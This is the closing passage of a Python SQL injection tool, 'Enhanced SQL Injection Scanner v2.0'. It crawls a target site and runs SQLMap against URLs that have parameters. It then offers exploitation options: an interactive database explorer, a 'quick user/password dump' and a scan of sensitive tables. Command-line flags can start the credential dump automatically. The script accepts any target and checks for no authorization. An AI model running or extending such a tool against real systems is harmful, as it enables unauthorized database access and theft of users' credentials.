            print(f"\n{Fore.GREEN}[✓] No vulnerabilities found in quick checks{Style.RESET_ALL}")
        
        # Step 3: SQLMap testing for URLs not already found vulnerable
        print(f"\n{Fore.CYAN}Phase 2: In-Depth SQLMap Analysis{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=max(1, self.threads // 2)) as executor:
            sqlmap_futures = []
            
            # Filter URLs to test
            urls_to_test = []
            for url in self.discovered_urls:
                parsed = urlparse(url)
                if parsed.query and url not in self.vulnerable_urls:
                    urls_to_test.append(url)
            
            # If we have too many URLs, ask user if they want to test all
            if len(urls_to_test) > 10:
                print(f"\n{Fore.YELLOW}Found {len(urls_to_test)} URLs to test with SQLMap.{Style.RESET_ALL}")
                choice = input(f"{Fore.YELLOW}Test all URLs (could take a long time) or just the first 5? (all/5): {Style.RESET_ALL}")
                
                if choice.lower() != 'all':
                    print(f"{Fore.CYAN}Testing only the first 5 URLs...{Style.RESET_ALL}")
                    urls_to_test = urls_to_test[:5]
            
            # Submit SQLMap tasks
            for url in urls_to_test:
                sqlmap_futures.append(
                    executor.submit(self.test_with_sqlmap, url)
                )
            
            # Monitor progress
            with tqdm(total=len(sqlmap_futures), desc="SQLMap scans", unit="url") as pbar:
                for _ in as_completed(sqlmap_futures):
                    pbar.update(1)
        
        # Final results
        if self.vulnerable_urls:
            print(f"\n{Fore.RED}[!] Found a total of {len(self.vulnerable_urls)} vulnerable URLs{Style.RESET_ALL}")
            for idx, url in enumerate(self.vulnerable_urls, 1):
                print(f"{Fore.RED}  {idx}. {url}{Style.RESET_ALL}")
            
            # Step 4: Interactive dumping if vulnerabilities found
            print(f"\n{Fore.YELLOW}=" * 60)
            print(f"EXPLOITATION OPTIONS")
            print("=" * 60 + Style.RESET_ALL)
            
            print(f"{Fore.CYAN}Available actions:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[1] Interactive database explorer{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[2] Quick user/password dump{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[3] Scan common sensitive tables{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[4] Generate report only{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.YELLOW}Select action (1-4): {Style.RESET_ALL}")
            
            if choice == '1':
                # Let user select which URL to dump
                self.log(1, f"{Fore.CYAN}Vulnerable URLs:{Style.RESET_ALL}")
                vuln_urls = list(self.vulnerable_urls)
                
                for idx, url in enumerate(vuln_urls, 1):
                    print(f"{Fore.GREEN}[{idx}] {url}{Style.RESET_ALL}")
                
                url_choice = input(f"\n{Fore.YELLOW}Choose a URL to explore (1-{len(vuln_urls)}): {Style.RESET_ALL}")
                
                try:
                    selected_url = vuln_urls[int(url_choice)-1]
                    self.interactive_dump(selected_url)
                except (IndexError, ValueError):
                    self.log(0, "Invalid URL selection")
            elif choice == '2':
                # Quick user/password dump
                vuln_urls = list(self.vulnerable_urls)
                for idx, url in enumerate(vuln_urls, 1):
                    print(f"{Fore.GREEN}[{idx}] {url}{Style.RESET_ALL}")
                
                url_choice = input(f"\n{Fore.YELLOW}Choose a URL (1-{len(vuln_urls)}): {Style.RESET_ALL}")
                
                try:
                    selected_url = vuln_urls[int(url_choice)-1]
                    self.quick_user_password_dump(selected_url)
                except (IndexError, ValueError):
                    self.log(0, "Invalid URL selection")
            elif choice == '3':
                # Scan common tables
                vuln_urls = list(self.vulnerable_urls)
                for idx, url in enumerate(vuln_urls, 1):
                    print(f"{Fore.GREEN}[{idx}] {url}{Style.RESET_ALL}")
                
                url_choice = input(f"\n{Fore.YELLOW}Choose a URL (1-{len(vuln_urls)}): {Style.RESET_ALL}")
                
                try:
                    selected_url = vuln_urls[int(url_choice)-1]
                    self.scan_common_tables(selected_url)
                except (IndexError, ValueError):
                    self.log(0, "Invalid URL selection")
        else:
            self.log(1, "No vulnerable URLs found")
        
        # Step 5: Generate report
        report_file = self.generate_report()
        
        # Calculate and display execution time
        execution_time = time.time() - start_time
        minutes, seconds = divmod(int(execution_time), 60)
        
        print(f"\n{Fore.YELLOW}=" * 60)
        print(f"SCAN SUMMARY")
        print("=" * 60 + Style.RESET_ALL)
        
        print(f"{Fore.CYAN}URLs scanned: {Fore.GREEN}{len(self.discovered_urls)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Vulnerable URLs: {Fore.RED if self.vulnerable_urls else Fore.GREEN}{len(self.vulnerable_urls)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Scan duration: {Fore.GREEN}{minutes} minutes, {seconds} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Results saved to: {Fore.GREEN}{self.output_dir}{Style.RESET_ALL}")
        
        if report_file:
            print(f"{Fore.CYAN}Report available at: {Fore.GREEN}{report_file}{Style.RESET_ALL}")
        
        return self.vulnerable_urls

def check_dependencies():
    """Check if required tools are installed."""
    try:
        subprocess.run(["sqlmap", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] SQLMap not found. Please install it using 'pip install sqlmap' or from https://github.com/sqlmapproject/sqlmap{Style.RESET_ALL}")
        return False
    return True

def main():
    """Main function to parse arguments and run the scanner."""
    banner = f"""
{Fore.CYAN}
 _____ _____ _     _     ___                             
|   __|     | |   |_|___|_  |___ ___ ___ ___ ___ ___ ___ 
|__   |  |  | |   | |___|  _|_ -|  _| .'|   |   | -_|  _|
|_____|__  _|_____|_|   |___|___|___|__,|_|_|_|_|___|_|  
        |__|                                                                                
{Style.RESET_ALL}
Enhanced SQL Injection Scanner v2.0
    """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="Enhanced SQL Injection Scanner with SQLMap Integration")
    parser.add_argument("--url", required=True, help="Target URL (e.g., https://example.com/page.php?id=1)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("--crawl-depth", type=int, default=3, help="Crawling depth (default: 3)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--verbosity", type=int, choices=[0, 1, 2, 3], default=1, help="Verbosity level (0-3)")
    parser.add_argument("--output-dir", help="Output directory for results (default: auto-generated)")
    parser.add_argument("--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--interactive", action="store_true", help="Enable interactive mode for database exploration")
    parser.add_argument("--quick-creds", action="store_true", help="Quick credential dump attempt")
    
    args = parser.parse_args()
    
    # Check dependencies
    if not check_dependencies():
        sys.exit(1)
    
    try:
        # Initialize scanner
        scanner = SQLInjectionScanner(
            url=args.url,
            threads=args.threads,
            crawl_depth=args.crawl_depth,
            timeout=args.timeout,
            verbosity=args.verbosity,
            output_dir=args.output_dir,
            proxy=args.proxy
        )
        
        # Run the scan
        vulnerable_urls = scanner.scan()
        
        # Display summary
        if vulnerable_urls:
            print(f"\n{Fore.RED}[!] {len(vulnerable_urls)} vulnerable URLs found.{Style.RESET_ALL}")
            
            # If interactive mode is enabled, automatically start interactive dumping
            if args.interactive and vulnerable_urls:
                print(f"\n{Fore.YELLOW}Starting interactive database explorer...{Style.RESET_ALL}")
                scanner.interactive_dump(next(iter(vulnerable_urls)))
            
            # If quick-creds is enabled, automatically attempt to dump credentials
            if args.quick_creds and vulnerable_urls:
                print(f"\n{Fore.YELLOW}Attempting quick credential dump...{Style.RESET_ALL}")
                scanner.quick_user_password_dump(next(iter(vulnerable_urls)))
        else:
            print(f"\n{Fore.GREEN}[✓] No vulnerabilities found.{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()